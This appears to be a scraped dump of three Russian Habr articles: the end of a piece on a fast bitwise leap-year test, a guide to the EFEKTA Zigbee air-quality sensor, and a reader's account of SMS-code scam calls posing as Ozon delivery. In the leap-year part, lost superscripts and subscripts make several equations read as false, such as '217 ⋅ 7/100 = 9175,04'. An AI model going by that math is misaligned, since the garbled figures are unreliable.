2814 2857 2871 2900 2914 2957 2971 3000 3014 3057 3071 3100 3114 3157 3171 3200
3214 3257 3271 3300 3314 3357 3371 3400 3414 3457 3471 3500 3514 3557 3571 3600
3614 3657 3671 3700 3714 3757 3771 3800 3814 3857 3871 3900 3914 3957 3971 4000
4014 4057 4071 4100 4114 4157 4200 4214 4257 4300 4314 4357 4400 4414 4457 4500
4514 4557 4600 4614 4657 4700 4714 4757 4800 4814 4857 4900 4914 4957
Здесь есть числа, кратные 100, как мы и хотели, но и куча других чисел. Это не проблема, если ни одно из них не окажется кратным 4, потому что мы уже отфильтровали их на предыдущем этапе. Кроме того, отсутствует 0, но это тоже не проблема, потому что 0 также кратен 400.
Давайте попробуем разобраться в паттерне. На первый взгляд, он выглядит очень простым: у нас есть *14, *57, *71, и *00. Однако начиная с 4171 числа *71 пропадают (вы заметили?). Позже появляются новые паттерны. Давайте проанализируем это. Результат работы программы на Python
def test(y):
    B = 126976
    return ((y * 9175) & B) == B

active = set()
for y in range(120000):
    r = y % 100
    if test(y):
        if r not in active:
            print(f'{y:6}: started *{r:02}')
            active.add(r)
    else:
        if r in active:
            print(f'{y:6}: stopped *{r:02}')
            active.remove(r)
будет таким:
    14: started *14
    57: started *57
    71: started *71
   100: started *00
  4171: stopped *71
 32843: started *43
 36914: stopped *14
 65586: started *86
 69657: stopped *57
 98329: started *29
102500: stopped *00
То есть начиная с 102500 мы больше не отлавливаем числа, кратные 100, и именно поэтому 102499 — последнее число, для которого is_leap_year_fast возвращает корректный результат. Также мы видим, что ниже него нет ни одного числа, кратного 4, за исключением кратных 100 (удобно, что мы можем проверить это, зная только два последних десятичных разряда). Если мы доверимся этой проверке перебором, то доказательство условия (2) на этом завершается; но давайте продолжим, чтобы лучше понять, почему получаются именно такие числа.
Для начала давайте разберёмся, почему мы получаем значения, кратные 100. Делитель 9175 близок к кратному 1/100 в 17-битном представлении с фиксированной запятой:
217 ⋅ 7/100 = 9175,04 (ровно).
Умножив число, кратное 100, на 9175,04, мы получим целое число (кратное 7) в битах 17 и выше, а биты ниже 17 будут нулевыми. Пример:
9175,04 ⋅ 500 = 100011000000000000000002, где 1000112 = 35 = 5 ⋅ 7.
Умножив число, кратное 100, на 9175, мы получим немного меньше:
9175 ⋅ 500 = 100011000000000000000002 − 500 ⋅ 0,04 = 100010111111111111011002.
В общем случае, вычитание небольшого значения из числа, заканчивающегося на кучу нулей, создаёт число, заканчивающееся на кучу единиц, за исключением самого конца. Здесь мы проверяем 5 битов в B. Для y, кратного 100, они все гарантированно будут единицами, если только накопленная ошибка не достигнет конца B, что произойдёт только после y = 212 / 0,04 = 102400, что нам подходит.
Откуда же берутся другие числа наподобие 14, 57 и 71? Давайте взглянем на это под другим углом. У нас есть 9175 = 217 ⋅ 0,06999969482421875 (ровно) и B = 217 ⋅ 0,96875, поэтому
p & B= B
⇔{y ⋅ 0,06999969482421875}≥ 0,96875, где {x} — дробная часть x
⇔6,999969482421875y mod 100≥ 96,875
Это ещё один способ понять, почему принимаются числа, кратные 100: для них 7y mod 100 равно 0, поэтому 6,999969482421875y mod 100 оказывается чуть меньше 100, и падает ниже 96,875 только после y = (100 − 96,875) / (7 − 6,999969482421875) = 102400.
Чтобы понять другие числа, встречающиеся в нашей последовательности, давайте сначала рассмотрим, какими будут решения, если бы в этом неравенстве было ровно 7:
7y mod 100≥ 96,875
⇔ 7y mod 100∈ {97, 98, 99}.
Чтобы найти решения этого, нам сначала потребуется число, обратное по модулю 7 modulo 100, то есть число x такое, что 7x mod 100 = 1. Мы можем вычислить его при помощи расширенного алгоритма Евклида или просто при помощи какого-нибудь онлайн-калькулятора, который сообщит нам, что результат равен 43. Тогда решениями будут 43 ⋅ 97 (mod 100), 43 ⋅ 98 (mod 100) и 43 ⋅ 99 (mod 100), то есть, соответственно, 71, 14 и 57 (mod 100). Это объясняет, почему мы сначала встречаем числа вида *14, *57 и *71. Это также объясняет, почему мы перестаём встречать, например, *71 после 4071: хотя 7 ⋅ 4171 = 29197, мы получаем 6,999969482421875 ⋅ 4171 = 29196,872711181640625, что (modulo 100) меньше, чем 96,875. Аналогично, мы встречаем 32843, потому что накопившаяся погрешность (7 − 6,999969482421875) ⋅ 32843 = 1,002288818359375 превышает единицу. Приложив ещё немного усилий, мы можем вручную воссоздать результат приведённой выше программы на Python и убедиться, что ни одно из этих чисел не кратно 4.
Расширение до других битовых ширин
Теперь, когда мы знаем, как работает этот трюк, можно попробовать подобрать параметры для других битовых ширин. Изменятся местоположение блока B и числитель знаменателя 100 в f & D.
uint64_t score(uint64_t f, uint64_t m, uint64_t t) {
      for (uint64_t y = 0; ; y++)
          if ((((y * f) & m) <= t) != is_leap_year(y))
              return y;
  }
  
  int main() {
      uint64_t best_score = 0;
      for (int k = 0; k < BITS; k++) {
          for (int k2 = 0; k2 < k; k2++) {
              uint64_t t = (1ULL << k) - (1ULL << k2);
              uint64_t m = (0b11ULL << (BITS - 2)) | t | 0b1111;
              for (int n = 0; n < 100; n++) {
                  uint64_t f = (0b01ULL << (BITS - 2)) | (((1ULL << k) * n) / 100);
                  uint64_t new_score = score(f, m, t);
                  if (new_score > best_score) {
                      printf(""%llu %llu %llu: %llu (%d %d %d)\n"",
                             f, m, t, new_score, k, k - k2, n);
                      best_score = new_score;
                  }
              }
          }
      }
      return 0;
  }
При BITS = 64 мы примерно за 7 минут находим f = 4611686019114582671, m = 13835058121854156815, t = 66571993088, которые корректны вплоть до y = 5965232499. Это здорово, потому что 5965232499 > 232, а значит, таким вариантом кода можно протестировать любой 32-битный год.
Какого максимального года мы можем достичь с 64 битами? Возможно, есть другие константы, которые работают ещё лучше? Я не могу сходу найти способ доказать это, поэтому попросил заняться этим других людей создав пост о задаче в Code Golf StackExchange. И спустя всего один час пользователь ovs опубликовал очень хороший результат, а два дня спустя пользователь Exalted Toast выложил доказательство того, что 5965232499 и в самом деле — наилучший возможный интервал для 64 битов, тоже воспользовавшись солвером z3.
Бенчмарк
Получить чёткие бенчмарки в этом случае сложно, потому что функция выполняется очень малое количество; более того, время исполнения версий с ветвлением зависит от паттернов ввода. Попробуем два крайних случая: всегда 2025 год и полностью случайные годы. Ниже приведены результаты бенчмарка на i7-8700K (Coffee Lake, 4.7 GHz), скомпилированного с g++ -O3 -fno-tree-vectorize:
2025 (нс)
случайный (нс)
is_leap_year
0.65
2.61
is_leap_year2
0.65
2.75
is_leap_year3
0.67
0.88
is_leap_year_fast
0.69
0.69
Вот некоторые из странностей:
При случайных значениях is_leap_year2 чуть медленнее is_leap_year. Это неожиданно, потому что для y % 100 требуется на одну команду больше, чем трюку в is_leap_year2.
is_leap_year3 чуть медленнее для случайных данных, чем для фиксированного значения. Это неожиданно, потому что функция не выполняет никакого ветвления.
У меня нет никаких других объяснений этому, кроме как то, что создание бенчмарков — сложная задача.
Для случайных данных новая функция is_leap_year_fast в 3,8 раза быстрее, чем стандартная реализация, а для полностью прогнозируемого ввода она примерно на 6% медленнее. В целом, результаты кажутся вполне стабильными.
Заключение
Стоит ли оно того? Нужно ли нам заменять, например, реализацию datetime CPython на этот трюк? Ответ зависит от обстоятельств. На практике, чаще всего будут запрашивать проверку текущего года, или, по крайней мере, запросы буду достаточно предсказуемы; в таком случае особого преимущества мы не получим. Чтобы изменения оправдали себя, в идеале нам нужен бенчмарк с реалистичными данными, который использует в качестве подпрограммы проверку года на високосность, а не простой микробенчмарк. С удовольствием услышал бы о результатах подобных измерений!"
Датчик качества воздуха EFEKTA Smart Air Quality Box,https://habr.com/ru/articles/910330/,"Приветствую всех читателей Habr, сегодня хочу рассказать вам о моем новом интересном проекте для умного дома — многофункциональном датчике качества воздуха EFEKTA Smart Air Quality Box, работающем на ...","Приветствую всех читателей Habr, сегодня хочу рассказать вам о моем новом интересном проекте для умного дома — многофункциональном датчике качества воздуха EFEKTA Smart Air Quality Box, работающем на протоколе Zigbee 3.0. Современные технологии умного дома активно развиваются, и одним из ключевых аспектов комфортной жизни становится контроль микроклимата. Качество воздуха в помещении напрямую влияет на здоровье, работоспособность и общее самочувствие. Если вам интересна тема контроля качества воздуха и вы хотите узнать чем закончилась эта разработка — добро пожаловать под кат.



В условиях, когда рынок переполнен устройствами с минимальным набором функций, использующими дешевые сенсоры сомнительной точности мне захотелось сделать решение, которое обладало бы следующими ключевыми параметрами:

Комплексный подход к мониторингу (CO₂, TVOC, PM2.5, температура/влажность, атмосферное давление)
Использование качественных сенсоров
Широкие функциональные возможности и гибкость настройки
Полноценная поддержка Zigbee 3.0 для интеграции в экосистемы умного дома

Свой выбор остановил на сенсорах компании Sensirion и Bosch.

Для измерения CO2 был выбран сенсор SCD40.

Компактный размер (11×11×6.5 мм) против крупногабаритных конкурентов
Низкое энергопотребление
Встроенная температурная компенсация
Точность: ±50 ppm + 5% на 1000ppm (MH-Z19 — ±75 ppm + 5%, CCS811 — ±150 ppm, SensAir S8 — ±70 ppm ±3%)
Автокалибровка с возможностью ручной калибровки
Минимальный дрейф показаний со временем
Цифровой интерфейс (I²C)



Для измерения ЛОС (летучие органические соединения) был выбран сенсор SGP40.

Компактный размер — самый маленький среди аналогов
Цифровая обработка сигнала непосредственно на чипе
Встроенный алгоритм компенсации влажности и температуры
Цифровой интерфейс (I²C)



Для измерения PM (твердых частиц) был выбран сенсор SPS30.

Лазерная дифракция + запатентованный алгоритм подавления ошибок от крупных частиц
Более точное разделение фракций PM1.0/PM2.5/PM4.0/PM10 (расширенный мультифракционный мониторинг)
Измерение преобладающего размера частиц
Минимальное влияние влажности на измерения
Стабильность показаний в широком диапазоне условий
Настраиваемый режим автоматической очистки
Самый тихий встроенный вентилятор среди аналогов
Цифровой интерфейс (I²C)



Для измерения атмосферного давления, температуры и влажности был выбран сенсор BME280.

Все три параметра (T/H/P) в одном корпусе
Высокая точность при компактных размерах
Высокая стабильность показаний во времени
Цифровой интерфейс (I²C)



В рамках проекта была реализована комплексная система визуализации и оповещения о качестве воздуха, включающая:

Многоцветную светодиодную интеллектуальную индикацию (на базе WS2812) для отображения уровней CO₂, TVOC и PM2.5 в реальном времени:

Голубой — отлично
Зеленый — норма
Желтый — приемлемо
Розовый — плохо
Красный — опасно

Звуковое оповещение при выходе параметров за допустимые пределы (на базе компактного зуммера):

C возможностью отключения сигнала при необходимости



Питание через USB Type-C с поддержкой:

От любых зарядных устройств (5V/250mA, PD, QC)

Профессиональный фабричный корпус (вместо 3D-печати):

Эстетичный и долговечный дизайн
Удобное крепление на стену или установка на стол



Функциональность

Датчик предназначен для работы в сетях Zigbee. работает на протоколе Zigbee3.0. Датчик является роутером сети. Поддерживает биндинг на исполнительные устройства в сети, конфигурирование отчетов.

В датчике реализован функционал автономного газостата. Датчик можно привязать к любым исполнительным устройствам в сети по кластеру OnOff, после привязки датчик будет управлять устройством напрямую по заданным порогам PM2.5, CO₂ и VOC, которые будут записаны в энергонезависимую память. Управление будет работать даже при временно неработающей сети Zigbee или отсутствии связи с умным домом. Работа триггеров реализована на интеллектуальном алгоритме, управление может осуществляться как по одному параметру (например, только CO₂), так и с использованием комбинированной логики (CO2 + PM2.5 + VOC).

Для более точных расчетов СO2 и VOC в датчике применены

Коррекция по атмосферному давлению (для CO2)

Данные с сенсора атмосферного давления BME280 в реальном времени передаются в сенсор CO2, для максимально точного расчета углекислого газа.

Динамическая компенсация по рассчитанной абсолютной влажности воздуха (для VOC)

На основе данных с сенсоров температуры и относительной влажности воздуха BME280 рассчитывается абсолютная влажность воздуха и в реальном времени передается в сенсор VOC, благодаря этому сенсор VOC более точно рассчитывает индекс загрязнения воздуха летучими органическими соединениями (VOC)

Цветовая индикация

Светодиодный индикатор отображает визуально уровень PM2.5, СO2 и VOC, работает сразу со всеми тремя типами данных. Уровень яркости светодиода настраивается через zigbee сеть в диапазоне 0-100%, настройка по умолчанию 1% яркости. Светодиод можно отключить командой через zigbee сеть.



Основные данные передающиеся в сеть Zigbee:

CO2
Уровень углекислого газа

PM2.5
Уровень твердых частиц размером 2.5 мкм и менее

PM1
Уровень твердых частиц размером 1 мкм и менее

PM4
Уровень твердых частиц размером 4 мкм и менее

PM10
Уровень твердых частиц размером 10 мкм и менее

PM Size
Преобладающий размер частиц в измеряемом воздухе

Air Quality Index (AQI)
Индекс качества воздуха на основе PM2.5 (EPA)

VOC index
Индекс летучих органических соединений

Pressure
Измеренное значение атмосферного давления

Temperature
Измеренное значение с сенсора температуры

Humidity
Измеренное значение сенсора влажности воздуха

zigbee2mqtt



sprut.hub



SLS



Конфигурационные команды для настройки работы устройства

Reading delay
Установка интервала считывания сенсоров. Установка времени в секундах, по умолчанию 10 секунд. Минимальный интервал 10 секунд, максимальный интервал 600 секунд.

Alarm
Активация звукового оповещения о критическом превышении уровней PM2.5, CO2, VOC

Light indicator
Включение или отключение RGB светодиода

Light indicator level
Регулировка яркости RGB светодиода, 0-100%, по умолчанию 1%

Temperature offset
Отрегулировать температуру внутреннего сенсора температуры, шаг 0.1 градус

Humidity offset
Отрегулировать влажность воздуха внутреннего сенсора влажности, шаг 1 процент

Auto clean interval
Когда датчик находится в режиме измерения, периодически запускается процедура автоматической очистки вентилятора с определенным интервалом очистки. Это позволяет разогнать вентилятор до максимальной скорости на 10 секунд, чтобы удалить пыль, скопившуюся внутри вентилятора. Измеренные значения не обновляются во время работы вентилятора. Интервал очистки по умолчанию установлен равным 7 дням. Интервал можно настроить с помощью внешней команды отправленной через zigbee сеть. Установив интервал равным 0, автоматическая очистка будет отключена. После установки интервал навсегда сохраняется в энергонезависимой памяти сенсора sps30.

Manual clean
Разовое включение очистки вентилятора сенсора PM. Вентилятор разгонится до максимальной скорости на 10 секунд, чтобы удалить пыль, скопившуюся внутри сенсора.

Forced_recalibration
Форсированная ручная калибровка №1. Это функционал сенсора SCD40 заложенный производителем сенсора, который реализован. Калибровка осуществляется на свежем воздухе, необходимо оставить датчик на чистом воздухе на 15 минут, по истечении этого времени отправить команду. Время калибровки примерно 5 секунд, после завершения калибровки точке соответствующей чистому воздуху будет задано значение в 450ppm. Датчик отправит команду «выключено» по завершению калибровки *1

Manual_forced_recalibration
Форсированная ручная калибровка №2. Это функционал сенсора SCD40 заложенный производителем сенсора, который реализован. Калибровка осуществляется по показаниям другого датчика СO2, показаниям которого вы доверяете. Необходимо оставить оба датчика рядом на 15 минут, наличие свежего воздуха не обязательное условие. По истечении этого времени, необходимо данные с датчика которому вы доверяете отправить на калибруемый датчик. Датчик вычтет разницу и будет в дальнейшем учитывать ее. *2

Automatic scal
Автоматическая само калибровка, цикл одна неделя, по умолчанию активирована.

Factory_reset_co2
Сброс сенсора углекислого газа к заводским настройкам. Это функционал сенсора SCD40 заложенный производителем сенсора, который реализован.

Enable_co2
Включение функционала газостата. Управление реле к которому привязан датчик по уровням CO2. Для работы данного функционала необходимо сделать привязку к исполнительному устройству(реле, розетки)*3

High_co2
Верхний порог углекислого газа

Low_co2
Нижний порог углекислого газа

Enable_PM
Включение функционала газостата. Управление реле к которому привязан датчик по уровням PM2.5. Для работы данного функционала необходимо сделать привязку к исполнительному устройству(реле, розетки)*4

High_PM
Верхний порог PM2.5

Low_PM
Нижний порог PM2.5

Enable_voc
Включение функционала газостата. Управление реле к которому привязан датчик по уровням VOC. Для работы данного функционала необходимо сделать привязку к исполнительному устройству(реле, розетки)*5

High_voc
Верхний порог летучих органических соединений

Low_voc
Нижний порог летучих органических соединений

*1,*2 Ручная форсированная калибровка не является обязательной и не рекомендуется для нового датчика. В сенсоре в фоновом режиме включена автоматическая калибровка, с интервалом подстройка 1 раз в неделю. Но попробовать не возбраняется, вывести из строя сенсор невозможно, и в любой момент можно сделать сброс к заводским настройкам.

*3,*4,*5 Одномоментно может работать как один тип, так и все сразу (PM2.5, CO2, VOC).

zigbee2mqtt



sprut.hub



SLS



**Интересный факт, ...


Ввод датчика в сеть, выход из сети

(на примере zigbee2mqtt, далее z2m)

Для джойна (вход в сеть), достаточно включить на контроллере джойн (join), подать питание, подключив датчик к кабелю usb type c. Если датчик уже работает в режиме без сети, то для того что бы добавить его в zigbee сеть нужно зажать кнопку джойстик сбоку на 5-7 секунд, при начале входа в сеть системный индикатор потухнет (находится под разъемом питания).

Если после входа в сеть на вкладке свойства нет всех значений конфигурационных атрибутов (пустые поля, переключатели в неопределенном состоянии) или на вкладке отчеты нет заполненных строк о типах данных со2, voc, температуре и т.д., то скорее всего конфигурация, которая следует сразу за интервью, не была пройдена до конца.

Для повторного прохождения конфигурации, нужно перейти на главную страницу z2m, найти строку датчика и справа нажать на кнопку — реконфигурация (желтая кнопка) и после этого несколько раз нажать кнопку на датчике. Это вызовет отправку всех основных и конфигурационных данных. При успешном прохождении конфигурации, в вэб интерфейсе z2m должно появится «всплывающее» сообщение об успешно пройдённой реконфигурации. В разделе датчика, на вкладке свойства должны появится значения и установки всех конфигурационных свойств, на странице отчеты должны появится строки с конфигурационными настройками отчетов.



Когда датчик в сети, то короткое нажатие на кнопку вызывает процедуру чтения всех сенсоров не по расписанию и отправку данных не в режиме настроенных отчетов.

Для выхода из сети (leave) нужно зажать кнопку на 10 секунд, системный индикатор начнет мигать (находится под разъемом питания), когда индикатор перестанет мигать (примерно 10 секунд), кнопку можно отпустить. Датчик отправит сообщение о выходе из сети, сотрет у себя все настройки в памяти. Так же выйти из сети можно удалив датчик из з2м без опции форс ремув.

Конфигурация отчетов

(на примере zigbee2mqtt, далее z2m)

Для конфигурации отчетов необходимо перейти на вкладку «Отчеты», и внести изменение в поля «Мин. интервал отчетов», «Макс. интервал отчетов», «Мин. интервал отчетов при изменении».

Мин. интервал отчетов — время, через которое будет отправлен новый отчет, при условии что новые значение изменилось в любую сторону, на величину указанную в поле «Мин. интервал отчетов при изменении», в сравнении с предыдущими значениями. Указывается время в секундах.

Макс. интервал отчетов — время, через которое будет отправлен новый отчет, при условии что значения не менялись на величину большую той которая указана в поле «Мин. интервал отчетов при изменении». Указывается время в секундах.

Мин. интервал отчетов при изменении — величина изменения данных. Для каждого типа данных указывается в своем формате, например для температуры 1 означает 0.01°C, так как данные передаются типом интегер16, например температура 22.54°C, будет передана датчиком так 2254.

zigbee2mqtt



sprut.hub



Привязка датчика EFEKTA Smart Air Quality Box к исполнительному устройству

(реле, розетки)
(на примере zigbee2mqtt, далее z2m)

Осуществляется на стороне датчика EFEKTA Smart Air Quality Box. Для привязки (биндинг) датчика EFEKTA Smart Air Quality Box к исполнительному устройству, для прямой передачи данных необходимо в веб интерфейсе контроллера перейти на страницу датчика EFEKTA Smart Air Quality Box и далее на вкладку «Связь».

В первом поле слева выбрать «1», в следующем поле, в выпадающем списке выбрать исполнительное устройство к которому необходимо сделать привязку, в следующем поле ввести номер кластера на реле. Правее выбрать кластер OnOff. Еще правее нужно нажать на кнопку «Связать».

zigbee2mqtt



sprut.hub



SLS



После привязки необходимо настроить пороги срабатывания и активировать отправку команд на привязанное устройство.

Это можно сделать в свойствах датчика.

После настройки датчик будет отправлять команды на включение и отключение на привязанное устройство напрямую.

На данный момент проект нативно поддерживается в zigbee2mqtt, в sprut.hub, в SLS

Не поддерживается напрямую через Yandex Zigbee Hub (возможна передача данных только через интеграции в УДЯ), в Smart Life (Tuya), в HOMEd.

В УДЯ через интеграцию в sprut.hub


Как мне кажется проект получился. А что Вы думаете по поводу данного проекта? Поделитесь своим мнением в комментариях!

Видео обзор датчика на канале «У Павла»


В заключении хочу заспойлерить другой мой проект, о котором напишу на Хабре через пару недель. И приглашаю вас в мой ТГ канал, где прямо сейчас стартовал розыгрыш трех устройств, о которых будет следующая статья.


Призы достаточно стоящие, а шансы поймать удачу за хвост совсем не маленькие.


Так же приглашаю читателей обсудить это и любые другие устройства, прошивки и прочий софт, работающий с Zigbee, в самое большое русскоязычное сообщество в Телеграм (более 11000 участников) — Вокруг да около Zigbee.

Моя группа в телеграм DIY DEV. Тут можно пообщаться на тему разработки DIY устройств, рассказать о своих проектах, или поделится интересными открытыми проектами, узнать больше информации о других датчиках Efekta.



Спасибо за внимание, всем добра!"
Озон и телефонные мошенники,https://habr.com/ru/articles/907988/,"""Предупрежден - значит вооружен""
(© народная мудрость)
Наверное все когда-нибудь сталкивались со звонками ""старшего майора государственной безопасности"" <имя неразборчиво>, объясняющего, что если не с...","""Предупрежден - значит вооружен""
(© народная мудрость)
Наверное все когда-нибудь сталкивались со звонками ""старшего майора государственной безопасности"" <имя неразборчиво>, объясняющего, что если не сделать то, что он скажет, то из свидетеля легко можно стать обвиняемым, или ""службы безопасности банка"" с предложением ""перевести деньги на защищённый счет"" для их сохранения, или ""из пенсионного фонда"" с просьбой ""подтверждения рабочего стажа"", для чего надо записаться на приём и продиктовать номер очереди из СМС, или другими случаями телефонного мошенничества.
Большинство при таких звонках сразу кладут трубку, а многие вообще не отвечают на звонки с незнакомых телефонных номеров, а то и просто блокируют их.
Но бывают ситуации, когда человек ждет подобного звонка, и поэтому становится особенно уязвимым. Например если вы заказали какой-то товар и ждете его доставку, то наверняка будете отвечать на все звонки, а если звонок окажется явно ""по теме"", то бдительность еще сильнее притупляется.
Ведь если человек ждёт доставку телевизора или холодильника, то вряд ли он будет блокировать звонки с незнакомых номеров, а при заказе пиццы, не станет сбрасывать звонок от доставщика пиццы.
Расскажу о двух случаях, с которыми я сам недавно столкнулся при ожидании доставки заказов Озон*
То, что номер из SMS нельзя диктовать ни при каких обстоятельствах я знаю, это уже своего рода условный рефлекс, как от горячего чайника.
Наверное только этот рефлекс, что ""Не надо так делать, а то обожжешься"", в данном случае и спас.
Но поволноваться все же пришлось...
Картинка из интернета
И да — мне уже за шестьдесят, седьмой десяток, и я в той самой ""группе риска"" ¯\_(ツ)_/¯
Предистория
Так получилось, что это был мой первый заказ на Озон с международной доставкой. Вообще-то я начал покупать на Озон давно, ещё в прошлом тысячелетии, но для заказа товаров из-за рубежа предпочитал Aliexpress, где покупать было ""просто выгодно, удобно""©. За полтора десятилетия было более семисот заказов, платиновый покупатель.
Однако с приходом Aliexpress.Russia к сожалению все испортилось, покупать стало намного сложнее, да и уровень цен стал существенно выше, чем на глобальном Aliexpress, сравнявшись, а иногда и превышая цены на других российских маркетплейсах, в т.ч и в Озон.
Словом я решил попробовать, и сделал свой первый заказ на Озон с доставкой из-за рубежа.
В отличие от внутренних заказов Озон, доставляемых как правило на следующий день, доставка из-за рубежа естественно намного дольше, сроки указываются примерные, по сравнению с Aliexpress излишне оптимистические, а по мере истечения просто переносятся, поэтому покупатель долго находится ""на низком старте"" в ожидании получения заказа.
Но вот наконец таможня пройдена, и заказ поступил во внутреннюю доставку ""последней мили"".
И тут следует звонок из ""службы доставки Озон"":
Первый звоночек
— Дмитрий <...>вич? Это служба доставки Озон.
— Слушаю...
— Мы доставляем Ваш заказ, ориентировочное время доставки в пункт выдачи сегодня во второй половине дня, но к сожалению накладная немного повреждена, давайте уточним пункт выдачи в Подольске.
— Улица <такая-то>, номер дома не помню.
— Спасибо, сейчас посмотрю... (небольшая пауза)... Так.. Пункт выдачи Озон по <такому-то> адресу. Всё верно?
— Да, всё правильно.
— Хорошо, сейчас я сделаю новую накладную. Одну минуточку... (небольшая пауза)... <диктует данные заказа>
— Да, все верно.
— Хорошо, сейчас Вам поступит SMS с новым номером заказа, продиктуйте его пожалуйста
— Э... Зачем???!!!???
— Ну мы ведь переоформили Ваш заказ, у него теперь другой номер, как же вы его сможете получить!
— Ну он ведь должен отразиться в моем личном кабинете, да и в SMS я увижу новый номер.
— Мы ведь должны убедиться, что вы его получили, иначе мы не сможем передать его в пункт выдачи.
— Да, я получил SMS, я это вам подтверждаю, можете отправлять.
— В таком случае мы будем вынуждены оставить заказ на складе, а через <сколько-то-там> недель вернём его отправителю. Потом вы получите деньги за отмененный (!!!) заказ.
— Ну так тому и быть! До свидания...
<кладу трубку>
После завершения звонка я конечно посмотрел, что же за SMS-ку я получил. SMS-ка от PONY EXPRESS (ссылку естественно не открывал, посмотрел через поисковик в интернете) — вроде как действительно логистическая компания, так что всё-таки остались сомнения, того ли человека я послал.
SMS-ка от PONY EXPRESS якобы с новым номером заказ Озон
Зашёл в Личный кабинет Озон, чтобы проверить, что же там изменилось. Ровным счётом ничего: ""новый"" заказ так и не появился, статус ""старого"" заказа остался прежним — на ""последней миле"", ориентировочный срок доставки сегодня вечером.
После этого решил пообщаться с техподдержкой Озона на предмет WTF, но это оказалось сложнее, чем Тесею пройти лабиринт Минотавра.
Игра с Озон в ""да и нет не говорить""
В Личном кабинете Озон есть чат, в котором можно мило пообщаться с роботом на отвлеченные темы, и получить кучу полезной, малополезной и бесполезной информации, кроме нужной — что же это был за звонок, и какова дальнейшая судьба моего заказа.
После ряда безуспешных попыток пробиться к оператору, я решил покинуть лабиринт Минотавра чат Озон, и пойти другим путём — спросить у Всемирного разума Google.
Как оказалось, Google тоже не знает как можно (и возможно ли в принципе) связаться с оператором Озон, однако подкинул ссылку на Ozon support в Telegram
И да — это тоже бот, но (в отличие от чата в личном кабинете) с какими-то зачатками искусственного интеллекта, с которым можно общаться на человеческом языке, а не выбирая вопросы из списка.
Через какое-то время я бота достал к нашему с ботом диалогу подключился оператор (во всяком случае мой личный тест Тьюринга он прошел).
Весь диалог приводить не буду, оставлю лишь заключительные сообщения.
Вместо чёткого ответа «да» или «нет» на ясно сформулированный вопрос, получены расплывчатые советы общего плана, как надо предохраняться. Ну и приписка «мы очень старались...» выглядит, как издевательство
Так и не получив чёткого ответа от бота (оператора?) Ozon support, решил просто подождать до вечера.
Вечером в Личном кабинете появилось сообщение
Заказ доставлен, можно забирать
Пошел забирать заказ (благо пункт выдачи Озон почти рядом) приготовившись фотографировать поврежденную упаковку. Но всё оказалось целым.
Так сказать Happy End...
Придя домой, я решил ещё раз пообщаться с Ozon support, чтобы расставить точки над ""Ё"", и уже в спокойной обстановке выяснить, что же это было.
Однако ответ оказался ещё более бессмысленным:
Ozon Support: «Исхитрись-ка мне добыть То-Чаво-Не-Может-Быть!»
Дело в том, что при заказе из-за рубежа продавцу в лично кабинете Озон в принципе невозможно написать ¯\_(ツ)_/¯
Да, кнопка ""Связаться с продавцом"" есть,
Страничка в личном кабинете Озон с кнопкой «Связаться с продавцом»
но при заказе товара с доставкой из-за рубежа она идёт в никуда
При заказе товара с доставкой из-за рубежа кнопка «Связаться с продавцом» идёт в никуда ¯\_(ツ)_/¯ 
Видимо для связи с продавцом нужно съездить в Китай, и разобраться с ним на месте (во всех смыслах этого слова).
/sarcasm
Кроме того, доставку ""последней мили"" осуществляет собственно Озон, да и предыдущие этапы как минимум начиная от таможни скорее всего тоже он.
В принципе на этом можно было бы поставить точку.
Всё ведь обошлось, я успокоился и, несмотря на этот неприятный инцидент, в целом я остался вполне доволен заказом (пять звёзд★★★★★), так что я ограничился ""одной звездой""★ и соответствующим комментарием в оценке приложения Озон в Google.Play*
Примечание: Ответа техподдержки Озон к моему ""однозвездному""★ отзыву так и не появилось.
Вскоре решил сделать ещё один заказ.
Второй заказ был уже побольше — Fanless Mini-PC*, почти на пределе беспошлинного лимита ввоза в РФ.
Примечание: Предыдущие Mini-PC, в частности описанный в статье Недорогой Mini-PC на платформе Intel NUC-Like 11th Generation Core i7-1165G7 с пассивным охлаждением я заказывал через Aliexpress.
Начало оказалось в общем-то такое же: Сверхоптимистические прогнозы сроков доставки, которые многократно переносятся, таможня, передача во внутреннюю доставку ""последней мили"", и...
В общем-то почти такое же продолжение:
За день до ожидаемого срока поступления заказа в пункт выдачи Озон, очередной звонок из ""службы доставки Озон"", на этот раз женским голосом:
— Дмитрий <...>вич? Это служба доставки Озон.
— Слушаю... SMS-ку читать? /sarcasm
— <мой выпад про SMS-ку игнорится> Мы должны доставить Ваш заказ, но Вы к сожалению забыли указать адрес доставки <видимо тут мне должно было стать стыдно>
— Как я мог не указать адрес, если он автоматически подставляется, я всегда получаю в одном и том же пункте выдачи, да и оформить заказ без этого невозможно!?!
— Ну возможно это наша ошибка, опять у нас что-то напутали <видимо тут я должен почувствовать, что сейчас общаюсь со всем дружным коллективом Озон>, хорошо, давайте уточним адрес пункта выдачи.
— Подольск, улица <такая-то>, номер дома не помню <мог бы и запомнить с прошлого раза>
— Сейчас посмотрю... (небольшая пауза)... Пункт выдачи Озон по <такому-то> адресу. Всё верно?
— Да, всё правильно.
— Хорошо, сейчас оформлю новый(!!!) заказ. Одну минуточку... (небольшая пауза)... <диктует данные заказа>
— Да, все верно.
— Хорошо, заказ будет доставлен завтра во второй половине дня (ура!!!). Сейчас Вам поступит SMS с новым номером заказа, продиктуйте его пожалуйста
— Ничего я диктовать не буду!!!
<кладу трубку>
через несколько секунд снова звонок, тот же женский голос, уже с менторскими нотками:
— Дмитрий <...>вич, ну вы же понимаете, <ну ещё бы, не дурак ведь!> что это новый заказ, и мы должны убедиться, что это Вы <а то мало ли кто ещё может ответить по моему мобильному, а получив к нему доступ SMS-ку он конечно же прочитать не сможет /sarcasm>
— Ничего я диктовать не буду! Поняла???
— <менторский тон меняется на истерический> Не поняла!!!
<бросает трубку>
После звонка я посмотрел, что за SMS-ка была на этот раз. Сейчас это была SMS от LITRES.RU — это уж совсем не похоже на логистику.
SMS-ка от LITRES.RU якобы с «Новым номером заказа Озон»
На всякий случай зашёл на сайт litres.ru, и там легко нахожу предупреждение осторожно, мошенники
«Осторожно, мошенники!» Предупреждение на сайте litres.ru
Практически мой случай, правда без указания, привязаны ли эти случаи к реальным заказам, но если как в моем случае SMS-ки связаны например с заказами Озон, то с точки зрения Litres.ru они происходят рандомно.
Если бы на сайте Озон было бы подобное предупреждение, то наверное и необходимости этой статьи не возникло бы*
Примечание: На сайте Озон есть предупреждение о Мошенничестве в интернете, но общего плана. Конечно это тоже важно (также как и мыть руки перед едой, и соблюдать бытовую гигиену), но всё-таки это совсем другое.
